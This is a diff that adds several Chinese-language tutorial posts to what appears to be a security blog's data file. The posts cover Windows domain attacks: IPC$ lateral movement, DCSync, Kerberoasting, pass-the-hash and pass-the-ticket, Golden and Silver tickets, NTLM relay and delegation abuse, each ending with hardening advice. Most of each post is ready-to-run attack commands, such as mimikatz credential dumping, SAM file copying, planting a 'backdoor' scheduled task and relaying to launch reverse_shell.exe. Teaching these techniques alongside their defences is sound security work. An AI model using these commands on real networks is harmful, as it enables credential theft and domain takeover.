+# SMB 扫描
+net view \\\\192.168.1.100
+net user /domain
+\`\`\`
+
+## 流程图
+
+\`\`\`
+┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
+│ 1. 网络环境   │───>│ 2. 存活探测   │───>│ 3. 服务识别   │───>│ 4. 漏洞扫描   │
+│ 路由/网段     │    │ ICMP/TCP     │    │ 端口/版本     │    │ CVE/弱口令    │
+└──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
+       │                   │                   │                    │
+  ip route/arp         nmap -sn/fscan      nmap -sV              nuclei/fscan
+  网卡信息             存活主机列表        服务版本              漏洞检测
+\`\`\`
+
+## 信息收集要点
+
+\`\`\`bash
+# 本机信息
+ipconfig /all; ifconfig -a
+route print; ip route
+arp -a
+netstat -ano; ss -antlp
+
+# 域信息
+nltest /dclist:domain.com
+net config workstation
+net user /domain
+net group "Domain Admins" /domain
+\`\`\`
+
+## 安全加固
+
+- **网络分段**：隔离关键资产
+- **限制扫描行为**：部署 IDS 检测端口扫描
+- **修改默认端口**：非标准端口降低被发现概率
+- **部署蜜罐**：诱导攻击者暴露行踪
+- **监控异常流量**：检测大量 SYN 扫描特征
+- **限制 SMB/SNMP 访问**：仅允许内网必要访问
+    `
+  },
+  {
+    slug: 'ipc-lateral',
+    title: '横向移动-IPC 命名管道',
+    date: '2026-06-15',
+    category: 'attack-defense',
+    subcategory: 'lateral',
+    tags: ['横向移动', 'IPC', 'SMB', 'Windows'],
+    summary: 'IPC$ 连接、文件传输和远程执行技术。',
+    content: `
+## IPC$ 连接
+
+### 建立连接
+
+\`\`\`cmd
+# 使用密码连接
+net use \\\\192.168.1.100\\ipc$ "password" /user:administrator
+
+# 使用哈希连接（Pass the Hash）
+net use \\\\192.168.1.100\\ipc$ "" /user:administrator
+\`\`\`
+
+### 查看连接
+
+\`\`\`cmd
+net use
+net use \\\\192.168.1.100\\ipc$ /delete
+\`\`\`
+
+## 文件传输
+
+### 复制文件
+
+\`\`\`cmd
+# 上传文件
+copy shell.exe \\\\192.168.1.100\\C$\\Windows\\Temp\\
+
+# 下载文件
+copy \\\\192.168.1.100\\C$\\Windows\\System32\\config\\SAM .\\
+\`\`\`
+
+### SMB 共享传输
+
+\`\`\`cmd
+# 列出共享
+net view \\\\192.168.1.100
+
+# 连接共享
+net use Z: \\\\192.168.1.100\\C$
+copy shell.exe Z:\\
+\`\`\`
+
+## 远程执行
+
+### at 计划任务
+
+\`\`\`cmd
+# 查询目标时间
+net time \\\\192.168.1.100
+
+# 创建计划任务
+at \\\\192.168.1.100 15:00 C:\\Windows\\Temp\\shell.exe
+\`\`\`
+
+### schtasks
+
+\`\`\`cmd
+schtasks /create /s 192.168.1.100 /tn "backdoor" /tr "C:\\Windows\\Temp\\shell.exe" /sc once /st 15:00
+schtasks /run /s 192.168.1.100 /tn "backdoor"
+\`\`\`
+
+### WMI 执行
+
+\`\`\`cmd
+wmic /node:192.168.1.100 /user:admin /password:pass process call create "cmd.exe /c whoami > C:\\temp\\out.txt"
+\`\`\`
+
+### PsExec
+
+\`\`\`cmd
+psexec \\\\192.168.1.100 -u admin -p pass cmd.exe
+\`\`\`
+
+## 攻击流程
+
+\`\`\`
+┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
+│ 1. 获取凭据   │───>│ 2. IPC连接    │───>│ 3. 文件传输   │───>│ 4. 远程执行   │
+│ 密码/哈希     │    │ net use      │    │ copy到目标    │    │ at/wmi/psexec│
+└──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
+       │                   │                   │                    │
+  mimikatz/LSA         445端口开放          C$默认共享          计划任务执行
+  凭据提取             命名管道连接         上传恶意程序        获取目标shell
+\`\`\`
+
+## 安全加固
+
+- **禁用默认共享**：
+  \`\`\`cmd
+  net share C$ /delete
+  net share admin$ /delete
+  # 注册表永久禁用
+  HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters
+  AutoShareServer = 0
+  \`\`\`
+- **启用 SMB 签名**：防止 NTLM Relay
+- **使用 LAPS**：随机化本地管理员密码
+- **限制 445 端口访问**：防火墙规则
+- **监控 IPC 连接**：Event ID 5140/5145
+- **部署 EDR**：检测 PsExec/WMI 横向移动
+    `
+  },
+  // 域渗透 - 补充
+  {
+    slug: 'domain-protocols',
+    title: '域内网协议详解',
+    date: '2026-06-20',
+    category: 'domain',
+    subcategory: 'domain-basic',
+    tags: ['域渗透', 'LDAP', 'Kerberos', 'NTLM', 'SMB'],
+    summary: 'LDAP、Kerberos、NTLM、SMB、RPC 协议原理。',
+    content: `
+## LDAP 协议
+
+### 端口
+
+- 389（明文）/ 636（LDAPS）
+- 用于目录服务查询和修改
+
+### 常用操作
+
+\`\`\`bash
+# LDAP 查询
+ldapsearch -x -h 192.168.1.1 -b "DC=corp,DC=local"
+
+# 使用域用户认证
+ldapsearch -x -H ldap://192.168.1.1 -D "user@corp.local" -w password -b "DC=corp,DC=local"
+\`\`\`
+
+## Kerberos 协议
+
+### 认证流程
+
+\`\`\`
+┌──────────┐    ┌──────────┐    ┌──────────┐    ┌──────────┐
+│ 1. AS-REQ│───>│ 2. AS-REP│───>│ 3. TGS-REQ│──>│ 4.TGS-REP│
+│ 客户端→KDC│    │ 返回TGT  │    │ 申请TGS   │    │ 返回TGS  │
+└──────────┘    └──────────┘    └──────────┘    └──────────┘
+       │                             │
+       └─────────────────────────────┘
+              5. AP-REQ → 服务端验证
+\`\`\`
+
+### 关键票据
+
+- **TGT**：Ticket Granting Ticket，访问 KDC
+- **TGS**：Ticket Granting Service，访问服务
+- **服务票据**：访问特定服务
+
+### 端口
+
+- 88（Kerberos 认证）
+
+## NTLM 协议
+
+### 认证流程
+
+\`\`\`
+1. 客户端发送用户名
+2. 服务端返回 Challenge
+3. 客户端用密码哈希加密 Challenge
+4. 服务端验证
+\`\`\`
+
+### NTLMv2 哈希
+
+\`\`\`
+# 格式
+username::domain:LMv2_response:NTv2_response:challenge
+\`\`\`
+
+## SMB 协议
+
+### 端口
+
+- 445（直接）/ 137-139（NetBIOS）
+
+### 功能
+
+- 文件共享
+- 打印共享
+- 认证（NTLM/Kerberos）
+- 远程管理
+
+### 常用操作
+
+\`\`\`bash
+# 列出共享
+smbclient -L //192.168.1.100 -U admin
+
+# 连接共享
+smbclient //192.168.1.100/C$ -U admin
+
+# 枚举用户
+enum4linux -a 192.168.1.100
+\`\`\`
+
+## RPC 协议
+
+### 端口
+
+- 135（RPC Endpoint Mapper）
+- 动态端口（1024-65535）
+
+### 常用工具
+
+\`\`\`bash
+# RPC 枚举
+rpcclient -U admin 192.168.1.100
+
+# 查询域用户
+rpcclient > enumdomusers
+rpcclient > queryuser admin
+\`\`\`
+
+## 安全加固
+
+- **启用 LDAP 签名**：防止 LDAP Relay
+- **强制 Kerberos**：禁用 NTLM
+- **启用 SMB 签名**：防止 Relay 攻击
+- **限制 RPC 访问**：防火墙规则
+- **部署域防火墙**：域控仅允许必要流量
+- **监控异常协议使用**：检测异常 LDAP/RPC 查询
+    `
+  },
+  {
+    slug: 'domain-dc-attack',
+    title: '域控获取方式',
+    date: '2026-06-19',
+    category: 'domain',
+    subcategory: 'domain-attack',
+    tags: ['域渗透', '域控', 'DCSync', 'Golden Ticket'],
+    summary: 'DCSync、Kerberoasting、AS-REP Roasting 和 Golden Ticket。',
+    content: `
+## DCSync
+
+### 原理
+
+模拟域控制器进行目录复制，获取任意用户哈希。
+
+### 使用 Mimikatz
+
+\`\`\`powershell
+# 获取 krbtgt 哈希
+mimikatz.exe "lsadump::dcsync /user:krbtgt" "exit"
+
+# 获取所有用户哈希
+mimikatz.exe "lsadump::dcsync /all /csv" "exit"
+\`\`\`
+
+### 使用 Impacket
+
+\`\`\`bash
+secretsdump.py CORP/administrator:P@ssw0rd123@192.168.1.1 -just-dc-ntlm
+\`\`\`
+
+## Kerberoasting
+
+### 原理
+
+请求服务票据并离线破解密码。
+
+### 攻击步骤
+
+\`\`\`powershell
+# 1. 枚举 SPN 用户
+Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
+
+# 2. 使用 Rubeus 请求票据
+Rubeus.exe kerberoast /outfile:hashes.txt
+
+# 3. 离线破解
+hashcat -m 13100 hashes.txt wordlist.txt -r rules/best64.rule
+\`\`\`
+
+## AS-REP Roasting
+
+### 原理
+
+攻击禁用预认证的用户。
+
+### 攻击步骤
+
+\`\`\`powershell
+# 1. 查找无预认证用户
+Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}
+
+# 2. 使用 Rubeus
+Rubeus.exe asreproast /outfile:asrep_hashes.txt
+
+# 3. 离线破解
+hashcat -m 18200 asrep_hashes.txt wordlist.txt
+\`\`\`
+
+## Golden Ticket
+
+### 原理
+
+使用 krbtgt 哈希伪造 TGT。
+
+### 生成票据
+
+\`\`\`powershell
+# 需要 krbtgt NTLM 哈希
+mimikatz.exe "kerberos::golden /user:administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:hash /ptt" "exit"
+
+# 验证
+klist
+\`\`\`
+
+## 攻击流程
+
+\`\`\`
+┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
+│ 1. 信息收集   │───>│ 2. 获取凭据   │───>│ 3. 域控攻击   │───>│ 4. 持久控制   │
+│ SPN/用户枚举  │    │ Kerberoasting │    │ DCSync       │    │ Golden Ticket│
+└──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
+       │                   │                   │                    │
+  BloodHound/ADRecon   离线破解密码         krbtgt哈希          任意身份伪造
+  用户/组/SPN         服务账户凭据         域管权限            永久后门
+\`\`\`
+
+## 安全加固
+
+- **定期更改 krbtgt 密码**：每180天，改两次间隔12小时
+- **启用预认证**：禁止设置 DoesNotRequirePreAuth
+- **限制 DCSync 权限**：审计 Replicating Directory Changes 权限
+  \`\`\`powershell
+  Get-ADPermission -Identity "DC=corp,DC=local" | Where-Object {$_.AccessRightType -eq "ExtendedRight"}
+  \`\`\`
+- **使用 AES256 加密**：避免使用 RC4
+- **部署蜜罐用户**：设置高价值 SPN 监控
+- **监控异常 TGS 请求**：Event ID 4769
+    `
+  },
+  {
+    slug: 'pass-the-hash',
+    title: '哈希传递攻击',
+    date: '2026-06-18',
+    category: 'domain',
+    subcategory: 'domain-techniques',
+    tags: ['域渗透', 'Pass the Hash', 'NTLM', 'Mimikatz'],
+    summary: 'PtH 原理、Mimikatz、Impacket 使用和防御方法。',
+    content: `
+## PtH 原理
+
+Pass the Hash（哈希传递）使用 NTLM 哈希直接认证，无需明文密码。
+
+### NTLM 认证流程
+
+\`\`\`
+1. 客户端 → 服务器：用户名
+2. 服务器 → 客户端：Challenge (8字节随机数)
+3. 客户端 → 服务器：Response = Hash(密码, Challenge)
+4. 服务器验证 Response
+\`\`\`
+
+### 关键点
+
+- NTLM 使用密码哈希而非明文
+- 拥有哈希即可通过认证
+- 无需破解密码
+
+## Mimikatz
+
+### 获取哈希
+
+\`\`\`powershell
+# 提取所有登录凭据
+mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+
+# 提取 SAM 数据库
+mimikatz.exe "privilege::debug" "lsadump::sam" "exit"
+
+# 提取 LSA 密码
+mimikatz.exe "privilege::debug" "lsadump::lsa" "exit"
+\`\`\`
+
+### PtH 使用
+
+\`\`\`powershell
+# NTLM PtH
+sekurlsa::pth /user:administrator /domain:corp.local /ntlm:hash /run:cmd.exe
+
+# Kerberos PtH
+kerberos::ptt ticket.kirbi
+\`\`\`
+
+## Impacket
+
+### psexec.py
+
+\`\`\`bash
+# 使用明文密码
+psexec.py CORP/administrator:P@ssw0rd123@192.168.1.100
+
+# 使用 NTLM 哈希
+psexec.py CORP/administrator@192.168.1.100 -hashes aad3b435...:f1f4d...
+\`\`\`
+
+### wmiexec.py
+
+\`\`\`bash
+wmiexec.py CORP/administrator@192.168.1.100 -hashes aad3b435...:f1f4d...
+\`\`\`
+
+### secretsdump.py
+
+\`\`\`bash
+# DCSync
+secretsdump.py CORP/administrator@192.168.1.1 -hashes aad3b435...:f1f4d... -just-dc-ntlm
+\`\`\`
+
+## 攻击流程
+
+\`\`\`
+┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
+│ 1. 获取哈希   │───>│ 2. 验证凭据   │───>│ 3. 横向移动   │───>│ 4. 域控攻击   │
+│ mimikatz     │    │ crackmapexec │    │ psexec/wmi    │    │ DCSync       │
+└──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
+       │                   │                   │                    │
+  sekurlsa模块         SMB测试             远程执行              krbtgt哈希
+  logonpasswords       凭据有效性          获取shell             域管权限
+\`\`\`
+
+## 安全加固
+
+- **启用 Credential Guard**：保护 NTLM 哈希
+  \`\`\`powershell
+  # Group Policy: Device Guard > Turn On
+  \`\`\`
+- **启用 SMB 签名**：防止 Relay 攻击
+- **使用 LAPS**：随机化本地管理员密码
+- **禁止域用户本地登录**：限制凭据缓存
+- **监控 4624 事件**：检测异常 NTLM 认证
+- **禁用 NTLM**：强制使用 Kerberos
+    `
+  },
+  {
+    slug: 'pass-the-ticket',
+    title: '票据传递攻击',
+    date: '2026-06-17',
+    category: 'domain',
+    subcategory: 'domain-techniques',
+    tags: ['域渗透', 'Pass the Ticket', 'Kerberos', 'Golden Ticket'],
+    summary: 'PtT 原理、Kerberos 票据和 Golden/Silver Ticket。',
+    content: `
+## PtT 原理
+
+Pass the Ticket（票据传递）使用 Kerberos 票据进行认证。
+
+### 票据类型
+
+- **TGT**：Ticket Granting Ticket，访问 KDC
+- **TGS**：Ticket Granting Service，访问服务
+- **Service Ticket**：访问特定服务
+
+## 获取票据
+
+### 导出票据
+
+\`\`\`powershell
+# Mimikatz 导出所有票据
+mimikatz.exe "sekurlsa::tickets /export" "exit"
+
+# Rubeus 导出
+Rubeus.exe triage
+Rubeus.exe dump /nowrap
+\`\`\`
+
+### Rubeus 请求票据
+
+\`\`\`powershell
+# 请求所有 SPN 票据
+Rubeus.exe requesttgs /user:admin /service:HTTP/web01.corp.local
+
+# 使用哈希请求 TGT
+Rubeus.exe asktgt /user:admin /rc4:hash /ptt
+\`\`\`
+
+## 票据注入
+
+### Mimikatz
+
+\`\`\`powershell
+# 注入票据到当前会话
+mimikatz.exe "kerberos::ptt ticket.kirbi" "exit"
+
+# 验证
+klist
+\`\`\`
+
+### Rubeus
+
+\`\`\`powershell
+# 注入票据
+Rubeus.exe ptt /ticket:ticket.kirbi
+
+# 请求并注入
+Rubeus.exe asktgt /user:admin /password:pass /ptt
+\`\`\`
+
+## Golden Ticket
+
+### 生成
+
+\`\`\`powershell
+# 需要 krbtgt NTLM 哈希和域 SID
+mimikatz.exe "kerberos::golden /user:administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:hash /ptt" "exit"
+\`\`\`
+
+### 特点
+
+- 有效期默认 10 年
+- 可伪造任意用户
+- 对 KDC 不可见
+
+## Silver Ticket
+
+### 生成
+
+\`\`\`powershell
+# 需要服务账户哈希
+mimikatz.exe "kerberos::golden /user:admin /domain:corp.local /sid:S-1-5-21-... /target:web01.corp.local /service:http /rc4:hash /ptt" "exit"
+\`\`\`
+
+### 特点
+
+- 仅对特定服务有效
+- 不需要访问 KDC
+
+## 攻击流程
+
+\`\`\`
+┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
+│ 1. 获取哈希   │───>│ 2. 生成票据   │───>│ 3. 注入票据   │───>│ 4. 访问服务   │
+│ krbtgt/服务   │    │ Golden/Silver │    │ ptt注入       │    │ 域资源访问    │
+└──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
+       │                   │                   │                    │
+  DCSync/Kerberoast    mimikatz/rubeus      当前会话注入          无限制访问
+  krbtgt/service hash  伪造票据            klist验证             域内任意资源
+\`\`\`
+
+## 安全加固
+
+- **定期更改 krbtgt 密码**：每180天改两次
+- **监控异常 TGS 请求**：Event ID 4769
+- **启用 AES 加密**：避免使用 RC4
+- **限制服务账户权限**：最小权限原则
+- **部署 ATA/Azure ATP**：检测异常票据行为
+- **监控 4768/4769 事件**：异常认证模式
+    `
+  },
+  {
+    slug: 'ntlm-relay',
+    title: 'NTLM 中继攻击',
+    date: '2026-06-16',
+    category: 'domain',
+    subcategory: 'domain-techniques',
+    tags: ['域渗透', 'NTLM Relay', 'Responder', 'SMB Relay'],
+    summary: 'NTLM Relay 原理、Responder、ntlmrelayx 和 SMB Relay。',
+    content: `
+## NTLM Relay 原理
+
+将捕获的 NTLM 认证转发到目标服务。
+
+### 攻击流程
+
+\`\`\`
+1. 受害者触发 NTLM 认证（如访问 UNC 路径）
+2. Responder 毒化 LLMNR/NBT-NS 响应
+3. 受害者向攻击者发送 NTLM 认证
+4. ntlmrelayx 将认证转发到目标服务
+5. 攻击者获取目标服务访问权限
+\`\`\`
+
+## Responder
+
+### 启动
+
+\`\`\`bash
+# 基本启动
+responder -I eth0
+
+# 启用所有毒化
+responder -I eth0 -wrf
+
+# 详细输出
+responder -I eth0 -wrf -v
+\`\`\`
+
+### 捕获哈希
+
+\`\`\`bash
+# 哈希保存位置
+/tmp/responder-logs/
+
+# 分析捕获的哈希
+cat /tmp/responder-logs/SMB-NTLMv2-*.txt
+\`\`\`
+
+## ntlmrelayx
+
+### 基本用法
+
+\`\`\`bash
+# Relay 到 SMB
+ntlmrelayx.py -t 192.168.1.100 -smb2support
+
+# 执行命令
+ntlmrelayx.py -t 192.168.1.100 -smb2support -c "whoami"
+
+# Relay 到 LDAP
+ntlmrelayx.py -t ldap://192.168.1.1 -t-aad -l loot.txt
+\`\`\`
+
+### 配合 Responder
+
+\`\`\`bash
+# 终端1：启动 Responder
+responder -I eth0 -wrf
+
+# 终端2：启动 ntlmrelayx
+ntlmrelayx.py -t 192.168.1.100 -smb2support -e reverse_shell.exe
+\`\`\`
+
+## SMB Relay
+
+### 条件
+
+- 目标未启用 SMB 签名
+- 目标允许 NTLM 认证
+
+### 检测
+
+\`\`\`bash
+# 使用 nmap 检查 SMB 签名
+nmap --script smb-security-mode -p 445 192.168.1.100
+
+# 使用 CrackMapExec
+crackmapexec smb 192.168.1.0/24 --gen-relay-list relays.txt
+\`\`\`
+
+## 攻击流程
+
+\`\`\`
+┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
+│ 1. 启动工具   │───>│ 2. 等待触发   │───>│ 3. 捕获认证   │───>│ 4. Relay攻击  │
+│ Responder    │    │ UNC/文件共享   │    │ NTLMv2哈希   │    │ ntlmrelayx   │
+└──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
+       │                   │                   │                    │
+  LLMNR/NBT-NS毒化    受害者输入错误      捕获NTLM认证        转发到目标服务
+  网络监听            网络名称解析        哈希记录             SMB/LDAP/HTTP
+\`\`\`
+
+## 安全加固
+
+- **启用 SMB 签名**：
+  \`\`\`powershell
+  # Group Policy
+  Microsoft network server: Digitally sign communications = Enabled
+  \`\`\`
+- **禁用 LLMNR**：
+  \`\`\`powershell
+  # Group Policy
+  Computer Configuration > Administrative Templates > Network > DNS Client
+  Turn off multicast name resolution = Enabled
+  \`\`\`
+- **禁用 NBT-NS**：
+  \`\`\`powershell
+  # 网络适配器设置
+  NetBIOS over TCP/IP = Disabled
+  \`\`\`
+- **启用 EPA**：Extended Protection for Authentication
+- **部署 Responder 检测**：监控 LLMNR/NBT-NS 异常
+- **使用 Kerberos 替代 NTLM**
+    `
+  },
+  {
+    slug: 'delegation-attack',
+    title: '委派攻击',
+    date: '2026-06-15',
+    category: 'domain',
+    subcategory: 'domain-techniques',
+    tags: ['域渗透', '委派', '非约束委派', '约束委派', 'RBCD'],
+    summary: '非约束委派、约束委派和 RBCD 攻击技术。',
+    content: `
+## 委派类型
+
+### 非约束委派
+
+服务器可以模拟用户访问任意服务。
+
+\`\`\`powershell
+# 查找配置非约束委派的计算机
+Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation
+
+# 查找配置非约束委派的服务账户
+Get-ADUser -Filter {TrustedForDelegation -eq $true}
+\`\`\`
+
+### 攻击原理
+
+\`\`\`
+1. 域管用户登录配置非约束委派的主机
+2. 主机获取域管 TGT 缓存
+3. 攻击者提取 TGT 访问域控
+\`\`\`
+
+### 利用
+
+\`\`\`powershell
+# 监控 TGT 缓存
+mimikatz.exe "privilege::debug" "sekurlsa::tickets" "exit"
+
+# 导出 TGT
+mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
+\`\`\`
+
+## 约束委派
+
+服务器只能模拟用户访问指定服务。
+
+### 查找
+
+\`\`\`powershell
+Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
+\`\`\`
+
+### 攻击原理
+
+\`\`\`
+1. 获取服务账户哈希
+2. 使用 S4U2Self 获取服务票据
+3. 使用 S4U2Proxy 获取目标服务票据
+4. 访问目标服务
+\`\`\`
+
+### 利用
+
+\`\`\`bash
+# 使用 impacket
+getTGT.py CORP/svc_web:password
+getST.py -spn HTTP/web01.corp.local -impersonate administrator CORP/svc_web@corp.local -k -no-pass
+\`\`\`
+
+## RBCD（基于资源的约束委派）
+
+### 原理
+
+低权限用户可以修改目标计算机的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性。
+
+### 查找
+
+\`\`\`powershell
+# 查找可修改的计算机对象
+Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
+\`\`\`
+
+### 利用
+
+\`\`\`powershell
+# 1. 创建机器账户
+New-MachineAccount -MachineAccount FakeComp -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)
+
+# 2. 设置 RBCD 属性
+Set-ADComputer web01 -PrincipalsAllowedToDelegateToAccount FakeComp$
+
+# 3. S4U 获取票据
+getST.py -spn HTTP/web01.corp.local -impersonate administrator CORP/FakeComp$:Password123@corp.local
+\`\`\`
+
+## 攻击流程
+
+\`\`\`
+┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
+│ 1. 枚举委派   │───>│ 2. 获取凭据   │───>│ 3. 利用委派   │───>│ 4. 访问资源   │
+│ AD查询/LDAP  │    │ 哈希/票据     │    │ S4U/TGT      │    │ 域控/服务器   │
+└──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
+       │                   │                   │                    │
+  BloodHound           Kerberoasting        非约束/约束委派       域管权限
+  委派配置查询         密码破解             RBCD利用             横向移动
+\`\`\`
+
+## 安全加固
+
+- **审计委派配置**：
+  \`\`\`powershell
+  # 查找所有委派
+  Get-ADObject -Filter {(msDS-AllowedToDelegateTo -ne "$null") -or (TrustedForDelegation -eq $true)}
+  \`\`\`
+- **避免非约束委派**：特别是域控上的服务
+- **限制约束委派目标**：仅允许必要的 SPN
+- **保护机器账户密码**：使用强密码
+- **监控 S4U 请求**：Event ID 4769
+- **部署蜜罐机器账户**：检测 RBCD 攻击
+    `
+  },
+
 ]
 
 export function getAllPosts() {
